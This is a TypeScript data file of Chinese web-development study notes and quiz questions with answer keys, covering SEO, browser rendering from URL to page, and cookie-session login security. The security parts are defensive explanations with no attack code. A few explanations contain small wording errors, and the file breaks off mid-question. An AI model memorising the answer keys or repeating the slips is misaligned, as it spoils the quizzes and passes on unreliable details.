import type { NetworkEntry } from './network-topics-types'

export const part3Topics: NetworkEntry[] = [
  // ─── 效能與快取 ──────────────────────────────────────────────────────────────
  {
    slug: 'seo-basics',
    title: 'SEO 基礎優化',
    description: '了解搜尋引擎優化的核心技術，包含 meta tags、語意化 HTML、結構化資料與效能指標',
    subCategory: '效能與快取',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: 'Meta Tags 核心設定',
          content: `\`\`\`html
<!-- 標題：每頁唯一，建議 50-60 字元 -->
<title>產品介紹 | 品牌名稱</title>

<!-- 描述：搜尋結果顯示的摘要，建議 120-160 字元 -->
<meta name="description" content="簡短描述頁面內容，吸引使用者點擊">

<!-- Canonical：告訴搜尋引擎正規 URL，避免重複內容 -->
<link rel="canonical" href="https://example.com/product">

<!-- Open Graph：控制在 Facebook/LINE 分享時的預覽 -->
<meta property="og:title" content="產品介紹">
<meta property="og:description" content="頁面描述">
<meta property="og:image" content="https://example.com/og-image.jpg">
<meta property="og:url" content="https://example.com/product">

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="產品介紹">
\`\`\``,
        },
        {
          heading: '語意化 HTML 與 h1-h6 層次',
          content: `正確的語意化 HTML 幫助搜尋引擎理解頁面結構：

\`\`\`html
<!-- 錯誤：全用 div，搜尋引擎難以理解 -->
<div class="header">...</div>
<div class="nav">...</div>

<!-- 正確：使用語意化標籤 -->
<header>
  <nav aria-label="主選單">...</nav>
</header>
<main>
  <h1>頁面主標題（每頁只能有一個 h1）</h1>
  <article>
    <h2>文章標題</h2>
    <h3>子標題</h3>
  </article>
</main>
<footer>...</footer>

<!-- alt 屬性：圖片無障礙與 SEO 必備 -->
<img src="product.jpg" alt="紅色運動鞋側面照">
<!-- 裝飾性圖片用空 alt -->
<img src="divider.png" alt="">

<!-- aria labels：輔助技術與 SEO 輔助 -->
<button aria-label="關閉對話框">✕</button>
\`\`\`

**h1-h6 層次規則**：
- 每頁只能有一個 \`h1\`，代表頁面最重要的主題
- h2 是主要章節，h3 是子章節，依此類推
- 不可跳過層次（h1 → h3），會讓搜尋引擎困惑`,
        },
        {
          heading: 'Core Web Vitals 核心指標',
          content: `Google 評估頁面體驗的三大指標：

| 指標 | 全名 | 衡量什麼 | 良好標準 |
|------|------|---------|---------|
| LCP | Largest Contentful Paint | 最大元素（圖片/文字）載入時間 | ≤ 2.5 秒 |
| INP | Interaction to Next Paint | 點擊/輸入到畫面回應的延遲 | ≤ 200ms |
| CLS | Cumulative Layout Shift | 版面意外位移量 | ≤ 0.1 |

\`\`\`
FID（First Input Delay）已於 2024 年 3 月被 INP 取代。

LCP 優化：
- 預載重要圖片：<link rel="preload" as="image" href="hero.jpg">
- 使用 CDN、壓縮圖片、使用 WebP 格式

INP 優化：
- 減少主執行緒阻塞（避免長任務 >50ms）
- 使用 Web Worker 處理複雜運算

CLS 優化：
- 圖片/影片設定 width 和 height 屬性
- 避免在頁面頂部插入廣告 Banner
- 使用 font-display: optional 避免字體載入時跳版
\`\`\``,
        },
        {
          heading: 'SSR vs CSR 對 SEO 的影響',
          content: `**CSR（Client-Side Rendering）的 SEO 問題**：
- 初始 HTML 幾乎是空的，搜尋引擎爬蟲拿到的是空殼
- Googlebot 雖可執行 JavaScript，但有時間限制和資源限制
- 社群媒體爬蟲（FB、LINE）通常不執行 JS，OG tags 讀不到

**SSR（Server-Side Rendering）的 SEO 優勢**：
- 伺服器直接回傳完整 HTML 內容
- 爬蟲可以立即讀取所有文字、meta tags
- TTFB（Time to First Byte）快，LCP 改善

**Next.js 的解法**：
\`\`\`tsx
// App Router：預設 Server Component，直接輸出完整 HTML
export async function generateMetadata(): Promise<Metadata> {
  return {
    title: '動態頁面標題',
    description: '描述',
    openGraph: { title: '...', images: ['...'] },
  }
}
\`\`\``,
        },
        {
          heading: 'robots.txt、Sitemap 與結構化資料',
          content: `**robots.txt**：告訴爬蟲哪些路徑可以/不可以爬

\`\`\`
User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /
Sitemap: https://example.com/sitemap.xml
\`\`\`

**sitemap.xml**：列出所有重要頁面幫助索引

\`\`\`xml
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://example.com/</loc>
    <lastmod>2024-01-01</lastmod>
    <changefreq>weekly</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>
\`\`\`

**Schema Markup（結構化資料）**：讓 Google 顯示 Rich Snippets

\`\`\`html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Product",
  "name": "紅色運動鞋",
  "offers": {
    "@type": "Offer",
    "price": "1200",
    "priceCurrency": "TWD"
  }
}
</script>
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: '以下哪個 meta tag 用於防止重複內容問題，告訴搜尋引擎哪個 URL 是「正規」版本？',
        options: [
          '<meta name="robots" content="noindex">',
          '<link rel="canonical" href="https://example.com/page">',
          '<meta property="og:url" content="https://example.com/page">',
          '<meta name="description" content="頁面描述">',
        ],
        answer: 1,
        explanation: 'canonical 標籤（<link rel="canonical">）用於指定頁面的正規 URL，解決重複內容問題。例如同一個頁面有多個 URL（帶/不帶 www、帶/不帶 trailing slash、UTM 參數版本），canonical 告訴 Google 哪個版本才是「主要」版本。og:url 是 Open Graph 標籤，用於社群分享預覽，不影響搜尋引擎爬取邏輯。',
      },
      {
        id: 2,
        question: '關於 h1-h6 標題層次，以下哪個說法正確？',
        options: [
          '一個頁面可以有多個 h1，這樣 SEO 效果更好',
          '可以從 h1 直接跳到 h3，不需要包含 h2',
          '每個頁面應只有一個 h1 作為主標題，其餘以 h2、h3 依序分層',
          'h1-h6 純粹是視覺樣式差異，對 SEO 沒有實質影響',
        ],
        answer: 2,
        explanation: '每個頁面應只有一個 h1，代表整頁最重要的主題關鍵字。h2 是主章節，h3 是子章節，層次要依序使用，不可跳過（如 h1 直接到 h3）。搜尋引擎用標題層次理解頁面內容架構，亂用層次會讓爬蟲困惑。HTML5 雖在技術上允許多個 h1（搭配 section），但 SEO 實務上仍建議只用一個 h1。',
      },
      {
        id: 3,
        question: 'Core Web Vitals 中，CLS（Cumulative Layout Shift）衡量的是什麼？',
        options: [
          '頁面最大元素（Hero 圖片）的載入時間',
          '使用者點擊到畫面回應的延遲',
          '頁面載入過程中版面意外移動的累積分數',
          '首次可互動的時間（Time to Interactive）',
        ],
        answer: 2,
        explanation: 'CLS（累積版面位移）衡量頁面載入時，元素意外移動的程度。例如讀取到一半突然插入廣告 Banner 導致內容下移，或圖片沒有設定尺寸導致載入後撐開版面。良好的 CLS 應低於 0.1。常見修正方式：圖片設定 width/height、廣告預留空間、使用 font-display: optional。LCP 是最大元素載入時間，INP（取代 FID）是互動回應延遲。',
      },
      {
        id: 4,
        question: '為什麼純 CSR（Client-Side Rendering）的 SPA 對 SEO 較不友善？',
        options: [
          'CSR 頁面的 URL 結構不標準，Google 無法解析',
          '初始回傳的 HTML 幾乎是空白，社群媒體爬蟲讀不到 meta tags，且 Google 爬蟲執行 JS 有延遲和限制',
          'CSR 不支援 HTTPS，Google 會降低排名',
          'CSR 頁面無法設定 canonical tags',
        ],
        answer: 1,
        explanation: '純 CSR 的 SPA 在伺服器返回的 HTML 幾乎只有 <div id="root"></div>，實際內容由 JavaScript 在瀏覽器端渲染。問題有兩點：1) Facebook、LINE 等社群媒體爬蟲通常不執行 JS，所以抓不到 og:title、og:image 等，分享預覽會空白；2) Googlebot 雖然能執行 JS，但有「第二波爬取」延遲，且 JS 執行耗費資源，可能影響索引及時性。SSR 解決此問題，讓伺服器直接輸出完整 HTML。',
      },
      {
        id: 5,
        question: '以下關於 robots.txt 的描述，哪個正確？',
        options: [
          'robots.txt 是加密文件，爬蟲必須解密後才能讀取',
          'robots.txt 放在網站根目錄，告訴爬蟲哪些路徑可以或不可以爬取',
          'robots.txt 設定 Disallow 後，頁面就不會出現在搜尋結果中',
          'robots.txt 只對 Google 爬蟲有效，對其他爬蟲無效',
        ],
        answer: 1,
        explanation: 'robots.txt 放在網站根目錄（如 https://example.com/robots.txt），是一個純文字文件，遵循 Robots Exclusion Protocol。它「建議」爬蟲哪些路徑不要爬，但並非強制性的（惡意爬蟲可以忽略）。注意：Disallow 只阻止爬取（crawling），但不能阻止索引（indexing）——如果其他網站有連結到該頁面，Google 仍可能索引它。要阻止索引應使用 <meta name="robots" content="noindex">。',
      },
      {
        id: 6,
        question: '什麼是 Schema Markup（結構化資料），它的主要用途是什麼？',
        options: [
          '一種 CSS 框架，用於改善頁面視覺排版',
          '用 JSON-LD 等格式標記頁面內容，讓 Google 在搜尋結果顯示 Rich Snippets（豐富摘要）',
          '用於加密頁面資料，防止競爭對手複製內容',
          '一種 HTTP Header，告訴瀏覽器如何快取頁面',
        ],
        answer: 1,
        explanation: 'Schema Markup（結構化資料）使用 schema.org 定義的格式（通常以 JSON-LD 寫在 <script type="application/ld+json"> 中），讓 Google 更理解頁面內容的語意，進而在搜尋結果顯示「豐富摘要」（Rich Snippets）——例如食譜頁面顯示星星評分和料理時間、產品頁面顯示價格和庫存、FAQ 頁面直接展開問答等。這可以提高點擊率（CTR）。',
      },
      {
        id: 7,
        question: '要修正 LCP（Largest Contentful Paint）過慢的問題，以下哪個方法最有效？',
        options: [
          '增加更多 CSS 動畫讓頁面看起來更流暢',
          '將所有 JavaScript 改為 inline script',
          '對 Hero 圖片使用 <link rel="preload"> 預載，並使用 WebP 格式壓縮',
          '增加更多 h1 標籤提高 SEO 權重',
        ],
        answer: 2,
        explanation: 'LCP 衡量的是頁面最大的可見元素（通常是 Hero 圖片或大標題）的渲染時間。改善方法：1) 用 <link rel="preload" as="image" href="hero.webp"> 讓瀏覽器提前載入重要圖片；2) 使用 WebP 格式（比 JPG/PNG 小 25-35%）；3) 使用 CDN 讓圖片從離使用者最近的伺服器提供；4) 設定適當快取。inline script 反而可能阻塞渲染（render-blocking）。',
      },
      {
        id: 8,
        question: 'Google 於 2024 年 3 月將哪個 Core Web Vitals 指標替換為 INP（Interaction to Next Paint）？',
        options: [
          'LCP（Largest Contentful Paint）',
          'CLS（Cumulative Layout Shift）',
          'FID（First Input Delay）',
          'TTFB（Time to First Byte）',
        ],
        answer: 2,
        explanation: 'FID（First Input Delay，首次輸入延遲）於 2024 年 3 月被 INP（Interaction to Next Paint，互動到下次繪製）取代。原因是 FID 只衡量第一次互動的延遲，而 INP 衡量整個頁面生命週期中所有互動的回應速度，更能反映真實的使用者體驗。INP 良好標準是 ≤ 200ms，需要和警告之間是 200ms-500ms，超過 500ms 為差。TTFB 不是 Core Web Vitals，但也是 Google 建議關注的效能指標。',
      },
    ],
    keyPoints: [
      'canonical 標籤指定正規 URL，解決同一頁面有多個 URL 的重複內容問題。',
      '每頁只能有一個 h1，標題層次需依序使用（h1 → h2 → h3），不可跳過。',
      'Core Web Vitals 三大指標：LCP（載入速度）、INP（互動回應）、CLS（版面穩定性），2024 年 FID 已被 INP 取代。',
      '純 CSR 頁面初始 HTML 為空，社群爬蟲讀不到 og tags，Google 爬取有延遲；SSR 直接輸出完整 HTML 更利於 SEO。',
      'robots.txt 告訴爬蟲「不爬」，但不保證不索引；要阻止索引需用 <meta name="robots" content="noindex">。',
      'Schema Markup（JSON-LD）讓 Google 在搜尋結果顯示 Rich Snippets，可提高點擊率。',
    ],
  },

  {
    slug: 'url-to-page',
    title: '從輸入 URL 到頁面渲染',
    description: '完整說明瀏覽器從輸入 URL 到畫面顯示的整個流程，涵蓋 DNS、TCP、HTTP 到渲染',
    subCategory: '效能與快取',
    difficulty: 'hard',
    notes: {
      sections: [
        {
          heading: '完整流程總覽',
          content: `\`\`\`
1. 輸入 URL → 解析 URL（scheme/host/path/query）
2. DNS 解析（Domain → IP）
   瀏覽器快取 → OS 快取 → Router → ISP DNS
   → Root DNS → TLD DNS（.com）→ Authoritative DNS
3. TCP 三次握手（建立連線）
   Client: SYN →
   Server: ← SYN-ACK
   Client: ACK →
4. TLS 握手（HTTPS 才有，建立加密通道）
5. HTTP 請求
   GET / HTTP/1.1
   Host: example.com
6. 伺服器處理並回傳 HTTP Response（HTML）
7. 瀏覽器解析 HTML → DOM Tree
8. 解析 CSS → CSSOM Tree
9. DOM + CSSOM → Render Tree（只含可見元素）
10. Layout（Reflow）：計算每個元素的位置和大小
11. Paint：將元素繪製成像素
12. Composite：將多個繪製層合成最終畫面
\`\`\``,
        },
        {
          heading: 'DNS 解析過程詳解',
          content: `DNS 解析是將人類可讀的域名轉換為 IP 地址的過程，採用遞迴查詢：

\`\`\`
查詢 www.example.com 的 IP：

1. 瀏覽器 DNS 快取（chrome://net-internals/#dns）
   └─ 找到 → 直接返回 IP
   └─ 沒找到 ↓

2. 作業系統 DNS 快取（/etc/hosts 或系統快取）
   └─ 找到 → 返回 IP
   └─ 沒找到 ↓

3. Router（路由器）的 DNS 快取
   └─ 沒找到 ↓

4. ISP 的 DNS 解析器（Recursive Resolver）
   └─ 沒找到 → 開始向上遞迴查詢 ↓

5. Root DNS 伺服器（全球 13 組）
   └─ 返回「.com TLD DNS 伺服器」的 IP

6. TLD DNS 伺服器（.com 的 DNS）
   └─ 返回「example.com 的 Authoritative DNS」的 IP

7. Authoritative DNS 伺服器（由域名所有者控制）
   └─ 返回 www.example.com 的實際 IP
\`\`\`

結果會被快取（根據 TTL 決定快取時間）`,
        },
        {
          heading: 'TCP 三次握手 與 TLS 握手',
          content: `**TCP 三次握手（建立可靠連線）**：

\`\`\`
Client                    Server
  |── SYN (seq=x) ──────→|   第一次：客戶端說「我要連線」
  |←── SYN-ACK ──────────|   第二次：伺服器說「好，收到」
  |── ACK ───────────────→|   第三次：客戶端確認「好的」
  |                        |   ← 連線建立完成
\`\`\`

**TLS 握手（HTTPS 加密）**：
在 TCP 三次握手後，額外進行 TLS 握手：

\`\`\`
1. Client Hello：客戶端發送支援的 TLS 版本、加密套件清單
2. Server Hello：伺服器選定加密套件，回傳數位憑證（Certificate）
3. 憑證驗證：瀏覽器驗證憑證由受信任的 CA 簽署
4. 金鑰交換：雙方協商產生對稱加密金鑰（Session Key）
5. 完成：後續通訊用對稱加密傳輸
\`\`\`

HTTP/2 可在同一 TCP 連線上多工（Multiplexing）傳送多個請求。
HTTP/3 改用 QUIC（基於 UDP），合併了 TCP 和 TLS 握手，更快。`,
        },
        {
          heading: '瀏覽器解析渲染流程（Critical Rendering Path）',
          content: `\`\`\`
HTML Bytes → Characters → Tokens → Nodes → DOM Tree
CSS Bytes  → Characters → Tokens → Nodes → CSSOM Tree

DOM Tree + CSSOM Tree → Render Tree
  (只含可見節點，排除 display:none、<head> 等)

Render Tree → Layout（Reflow）
  計算每個節點的幾何資訊（x, y, width, height）

Layout → Paint
  將節點繪製成實際像素（文字、顏色、圖片、邊框等）

Paint → Composite
  瀏覽器可能將頁面分成多個 Layer（例如有 transform 的元素）
  最後在 GPU 上合成最終畫面
\`\`\`

**JavaScript 阻塞問題（Render-Blocking）**：

\`\`\`html
<!-- 阻塞渲染：瀏覽器遇到 script 會暫停解析 HTML -->
<script src="app.js"></script>

<!-- defer：下載不阻塞，HTML 解析完後才執行，保持順序 -->
<script defer src="app.js"></script>

<!-- async：下載不阻塞，下載完立即執行，順序不保證 -->
<script async src="analytics.js"></script>

<!-- CSS 也會阻塞渲染（CSSOM 完成前不繪製） -->
<link rel="preload" as="style" href="critical.css">
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'DNS 解析時，查詢順序正確的是？',
        options: [
          'Root DNS → TLD DNS → Authoritative DNS → ISP DNS',
          '瀏覽器快取 → OS 快取 → Router → ISP DNS → Root DNS → TLD DNS → Authoritative DNS',
          'ISP DNS → OS 快取 → 瀏覽器快取 → Root DNS',
          '直接向 Authoritative DNS 查詢',
        ],
        answer: 1,
        explanation: 'DNS 解析從最近的快取開始往外查：1) 瀏覽器自身 DNS 快取；2) 作業系統快取（包含 /etc/hosts）；3) Router 快取；4) ISP 的遞迴解析器（Recursive Resolver）。若都找不到，遞迴解析器才向上查詢：Root DNS → TLD DNS（如 .com）→ Authoritative DNS（域名所有者控制）。每一層找到後會依 TTL 快取結果。',
      },
      {
        id: 2,
        question: 'TCP 三次握手的步驟是？',
        options: [
          'SYN → ACK → SYN-ACK',
          'ACK → SYN → SYN-ACK',
          'SYN → SYN-ACK → ACK',
          'SYN-ACK → SYN → ACK',
        ],
        answer: 2,
        explanation: 'TCP 三次握手：1) Client 發 SYN（同步）封包，表示「我想建立連線」；2) Server 回 SYN-ACK（同步確認），表示「收到，我也準備好了」；3) Client 再發 ACK（確認），表示「好的，開始通訊」。三次握手確保雙方都能正常發送和接收。HTTP/3 使用 QUIC（基於 UDP），將握手和 TLS 合併，通常只需要 0-RTT 或 1-RTT 就能開始傳輸。',
      },
      {
        id: 3,
        question: '在關鍵渲染路徑（Critical Rendering Path）中，Render Tree 是由哪兩個東西合成？',
        options: [
          'HTML + JavaScript',
          'DOM Tree + CSSOM Tree',
          'Layout Tree + Paint Tree',
          'HTTP Response + DNS 快取',
        ],
        answer: 1,
        explanation: '瀏覽器解析 HTML 生成 DOM Tree（文件物件模型），解析 CSS 生成 CSSOM Tree（CSS 物件模型）。兩者合併成 Render Tree，只包含可見的節點（排除 display:none、<head>、<script> 等不可見元素）。Render Tree 是後續 Layout 和 Paint 的基礎。',
      },
      {
        id: 4,
        question: '以下哪個 script 標籤的屬性，可以讓 JS 下載不阻塞 HTML 解析，且在 HTML 解析完成後才執行（保持原始順序）？',
        options: [
          '<script async src="app.js">',
          '<script defer src="app.js">',
          '<script lazy src="app.js">',
          '<script blocking="false" src="app.js">',
        ],
        answer: 1,
        explanation: 'defer：JS 下載與 HTML 解析同時進行（不阻塞），但等到 HTML 完整解析完畢後，再依照 script 的出現順序執行。適合需要操作 DOM 的腳本。async：下載不阻塞，但下載完成後立即執行（可能在 HTML 解析中途），不保證執行順序。適合獨立的第三方腳本（如 GA）。lazy 和 blocking="false" 不是標準 script 屬性。',
      },
      {
        id: 5,
        question: 'TLS 握手的主要目的是什麼？',
        options: [
          '加速 DNS 查詢速度',
          '建立可靠的 TCP 連線',
          '驗證伺服器身份並協商加密金鑰，建立安全的加密通道',
          '壓縮 HTTP 請求的大小',
        ],
        answer: 2,
        explanation: 'TLS 握手在 TCP 連線建立後進行，目的是：1) 身份驗證：瀏覽器驗證伺服器的數位憑證由受信任的 CA（憑證授權機構）簽署；2) 金鑰交換：雙方協商產生對稱加密的 Session Key；3) 後續所有 HTTP 資料都用此對稱金鑰加密傳輸，防止中間人竊聽（Man-in-the-Middle Attack）。',
      },
      {
        id: 6,
        question: 'Layout（Reflow）和 Paint 的差別是什麼？',
        options: [
          'Layout 負責下載資源，Paint 負責執行 JavaScript',
          'Layout 計算元素的幾何位置和大小，Paint 將元素繪製成實際像素',
          'Layout 建立 DOM Tree，Paint 建立 CSSOM Tree',
          'Layout 和 Paint 是同一個步驟的不同叫法',
        ],
        answer: 1,
        explanation: 'Layout（又稱 Reflow）：根據 Render Tree，計算每個節點的確切幾何資訊，包含 x/y 座標、寬度、高度。改變元素大小、位置、數量都會觸發 Reflow，是昂貴的操作。Paint（繪製）：將 Layout 的結果轉換成實際像素，包含文字顏色、背景色、陰影、圖片等。最後 Composite（合成）步驟將多個繪製層（Layer）在 GPU 上疊加成最終畫面。使用 CSS transform/opacity 只觸發 Composite，跳過 Layout 和 Paint，效能最佳。',
      },
      {
        id: 7,
        question: 'HTTP/2 和 HTTP/1.1 在連線處理上的主要差異是什麼？',
        options: [
          'HTTP/2 不需要 TLS，速度更快',
          'HTTP/2 支援多工（Multiplexing），可在單一 TCP 連線上同時傳送多個請求',
          'HTTP/2 只支援 GET 和 POST 方法',
          'HTTP/2 將 HTTP 改為基於 UDP 的協議',
        ],
        answer: 1,
        explanation: 'HTTP/1.1 的問題（Head-of-Line Blocking）：每個 TCP 連線一次只能處理一個請求，瀏覽器通常開 6 個並行連線來繞過此限制。HTTP/2 多工（Multiplexing）：在單一 TCP 連線上，多個請求和回應可以交錯傳輸（以 Frame 為單位），大幅提升效率。HTTP/2 也支援 Header 壓縮（HPACK）和伺服器推送（Server Push）。HTTP/3（QUIC）才是改用 UDP。',
      },
    ],
    keyPoints: [
      'DNS 查詢順序：瀏覽器快取 → OS 快取 → Router → ISP DNS → Root → TLD → Authoritative DNS。',
      'TCP 三次握手：Client 發 SYN → Server 回 SYN-ACK → Client 發 ACK，確保雙向通訊可靠。',
      'TLS 握手在 TCP 之後，驗證伺服器憑證並協商加密金鑰，HTTP/3 用 QUIC 合併了這兩個步驟。',
      '渲染流程：HTML → DOM，CSS → CSSOM，DOM + CSSOM → Render Tree → Layout → Paint → Composite。',
      'defer 讓 JS 下載不阻塞 HTML，且在 HTML 解析完後按順序執行；async 下載完立即執行，不保證順序。',
      'CSS transform/opacity 變更只觸發 Composite，跳過 Layout 和 Paint，是效能最佳的動畫方式。',
    ],
  },

  // ─── 認證與授權 ──────────────────────────────────────────────────────────────
  {
    slug: 'login-cookie-session',
    title: '登入功能實作（Cookie + Session）',
    description: '了解傳統 Cookie-Session 登入流程的完整實作，包含安全設定與常見問題',
    subCategory: '認證與授權',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: 'Cookie-Session 登入流程',
          content: `\`\`\`
登入流程：

1. 使用者輸入帳號密碼，瀏覽器發送 POST /login
   Body: { username: "alice", password: "pw123" }

2. 伺服器驗證憑證（比對資料庫中的 hash）

3. 驗證成功 → 建立 Server-side Session
   Session 資料儲存在伺服器（記憶體或 Redis）
   Session ID：隨機產生的唯一字串（如 UUID）

4. 伺服器回傳 HTTP Response，設定 Cookie：
   Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

5. 瀏覽器自動儲存 Cookie

後續請求：
   瀏覽器自動在每個請求帶上 Cookie：
   Cookie: sessionId=abc123
   伺服器收到後，查詢 Session Store 驗證使用者身份

登出流程：
   1. 伺服器刪除 Session Store 中的對應 Session
   2. 回傳 Set-Cookie: sessionId=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
\`\`\``,
        },
        {
          heading: 'Cookie 安全屬性',
          content: `| 屬性 | 說明 | 防護目標 |
|------|------|---------|
| \`HttpOnly\` | Cookie 不能被 JavaScript（document.cookie）讀取 | 防止 XSS 竊取 Cookie |
| \`Secure\` | Cookie 只在 HTTPS 連線下傳送 | 防止網路監聽竊取 |
| \`SameSite=Strict\` | Cookie 只在同源請求中傳送 | 防止 CSRF 攻擊 |
| \`SameSite=Lax\` | 跨站 GET 導覽可帶（預設值） | 平衡安全與使用體驗 |
| \`SameSite=None; Secure\` | 跨站請求都可帶（需搭配 Secure） | 第三方 Cookie |
| \`Expires / Max-Age\` | Cookie 的有效期限 | 控制 Session 存活時間 |

\`\`\`http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
\`\`\``,
        },
        {
          heading: 'Session 儲存方式：記憶體 vs Redis',
          content: `**記憶體（In-Memory）**：
- 優點：實作簡單，存取速度快
- 缺點：
  - 伺服器重啟後所有 Session 消失（用戶需重新登入）
  - 無法水平擴展（多個伺服器實例各自有不同的記憶體，Session 無法共享）

**Redis（外部 Session Store）**：
- 優點：
  - 持久化（伺服器重啟 Session 仍在）
  - 支援多伺服器共享 Session（水平擴展）
  - 可設定 TTL 自動過期
- 缺點：需要額外的 Redis 伺服器

\`\`\`js
// Express + connect-redis 範例
const session = require('express-session')
const RedisStore = require('connect-redis')(session)

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, maxAge: 3600000 }
}))
\`\`\``,
        },
        {
          heading: 'Session Hijacking 與防禦',
          content: `**Session Hijacking（Session 劫持）**：
攻擊者竊取使用者的 Session ID，冒充使用者身份。

**常見竊取方式**：
1. XSS（跨站腳本攻擊）：在頁面注入惡意 JS 讀取 Cookie
   → 防禦：設定 HttpOnly，JS 無法讀取
2. 網路監聽（中間人攻擊）：HTTP 傳輸明文 Cookie
   → 防禦：設定 Secure，只在 HTTPS 傳送
3. CSRF（跨站請求偽造）：誘導用戶在惡意網站發送請求
   → 防禦：設定 SameSite，或使用 CSRF Token

**其他防禦措施**：
\`\`\`js
// 登入後更換新的 Session ID（防止 Session Fixation 攻擊）
req.session.regenerate((err) => {
  req.session.userId = user.id
  res.json({ success: true })
})

// 綁定 IP 或 User-Agent（較激進，可能影響體驗）
if (session.ip !== req.ip) {
  // 強制重新登入
}
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'Cookie 的 HttpOnly 屬性主要防止什麼攻擊？',
        options: [
          '防止 CSRF（跨站請求偽造）',
          '防止 XSS 攻擊中 JavaScript 讀取 Cookie 竊取 Session ID',
          '防止中間人攻擊（Man-in-the-Middle Attack）',
          '防止 SQL Injection',
        ],
        answer: 1,
        explanation: 'HttpOnly 讓 Cookie 無法被 JavaScript 的 document.cookie 讀取，主要防止 XSS 攻擊。即使攻擊者在頁面注入惡意腳本，也無法讀取帶有 HttpOnly 的 Cookie。防止 CSRF 主要靠 SameSite 屬性；防止中間人攻擊靠 Secure 屬性（只在 HTTPS 傳送）；SQL Injection 是資料庫層面的問題，和 Cookie 無關。',
      },
      {
        id: 2,
        question: '在 Cookie-Session 登入架構中，Session ID 儲存在哪裡，Session 資料儲存在哪裡？',
        options: [
          'Session ID 在伺服器，Session 資料在 Cookie',
          'Session ID 和 Session 資料都在 Cookie 中',
          'Session ID 在 Cookie（客戶端），Session 資料在伺服器（記憶體或 Redis）',
          'Session ID 和 Session 資料都在伺服器記憶體',
        ],
        answer: 2,
        explanation: 'Cookie-Session 架構的核心：Cookie 只存一個隨機的 Session ID（如 UUID），這是無意義的字串，即使被竊取也看不出用戶資訊。實際的 Session 資料（user ID、角色、登入時間等）儲存在伺服器端的 Session Store（記憶體或 Redis）。每次請求時，伺服器用 Cookie 中的 Session ID 去查詢 Session Store，取得對應的使用者資訊。',
      },
      {
        id: 3,
        question: '以下哪個 SameSite 設定值，可以讓 Cookie 只在完全同源的請求中傳送（防止所有跨站攜帶）？',
        options: [
          'SameSite=None',
          'SameSite=Lax',
          'SameSite=Strict',
          'SameSite=HttpOnly',
        ],
        answer: 2,
        explanation: 'SameSite=Strict：最嚴格，Cookie 只在完全同源請求中帶出，連從外部網站點連結（top-level navigation）都不帶，適合高安全性場景。SameSite=Lax：預設值，跨站的 GET 導覽（如點連結）會帶 Cookie，但跨站 POST 不帶，平衡安全與體驗。SameSite=None：需搭配 Secure，允許跨站攜帶，用於第三方 Cookie 場景。SameSite=HttpOnly 不存在，HttpOnly 是另一個獨立屬性。',
      },
      {
        id: 4,
        question: '為什麼在生產環境中應該使用 Redis 而不是記憶體（In-Memory）來儲存 Session？',
        options: [
          'Redis 的讀寫速度比記憶體快',
          'In-Memory Session 無法在多台伺服器間共享，且伺服器重啟後 Session 消失',
          'Redis 讓 Session 的安全性更高，不會被 XSS 攻擊',
          'In-Memory 不支援設定 Session 過期時間',
        ],
        answer: 1,
        explanation: 'In-Memory Session 在生產環境有兩大問題：1) 無法水平擴展：若服務部署多台伺服器，負載均衡可能將同一用戶的不同請求路由到不同伺服器，各伺服器的記憶體是隔離的，Session 無法共享，導致用戶隨機被登出；2) 伺服器重啟後 Session 消失，所有用戶需重新登入。Redis 是獨立的 Session Store，多台伺服器共享，且支援持久化和 TTL。',
      },
      {
        id: 5,
        question: '使用者點擊「登出」後，伺服器應該執行哪些操作？',
        options: [
          '只需清除客戶端的 Cookie',
          '只需刪除伺服器端的 Session 資料',
          '同時刪除伺服器端的 Session，並回傳 Set-Cookie 清除客戶端 Cookie',
          '傳送一個 JWT Token 告訴客戶端登出',
        ],
        answer: 2,
        explanation: '完整的登出需要兩個步驟：1) 刪除伺服器端 Session Store 中的 Session 記錄，讓 Session ID 失效；2) 通知客戶端清除 Cookie（回傳 Set-Cookie 設定 Expires 為過去時間或 Max-Age=0）。只做其中一個都有問題：只清 Cookie 的話，Session 仍在伺服器，如果攻擊者之前竊取了 Session ID，仍可使用；只刪 Session 的話，Cookie 還在瀏覽器，下次請求會帶無效的 Session ID 造成錯誤（但至少不安全）。',
      },
      {
        id: 6,
        question: '什麼是 Session Fixation 攻擊，如何防範？',
        options: [
          '攻擊者猜測 Session ID 的值；防範方式是讓 Session ID 足夠長且隨機',
          '攻擊者事先植入固定的 Session ID，讓使用者登入後使用相同 ID；防範方式是登入後重新產生新的 Session ID',
          '攻擊者固定住使用者的 IP 地址；防範方式是使用 HTTPS',
          '攻擊者讓 Session 永不過期；防範方式是設定 Max-Age',
        ],
        answer: 1,
        explanation: 'Session Fixation 攻擊：攻擊者事先取得一個合法的 Session ID（例如從登入前的匿名 Session），然後誘導受害者使用這個 Session ID 登入。一旦受害者登入，Session ID 對應的 Session 就帶有了認證資訊，攻擊者就可以用同一個 Session ID 冒充受害者。防範方式：在使用者成功登入後，立即廢棄舊的 Session 並重新產生一個全新的 Session ID（如 Express 的 req.session.regenerate()）。',
      },
      {
        id: 7,
        question: '以下哪個 Cookie 設定組合對安全性最有保障（適用於登入 Session）？',
        options: [
          'document.cookie = "sessionId=abc"（用 JS 設定，沒有任何安全屬性）',
          'Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict',
          'Set-Cookie: sessionId=abc; SameSite=None',
          'Set-Cookie: sessionId=abc; HttpOnly; SameSite=None; Secure',
        ],
        answer: 1,
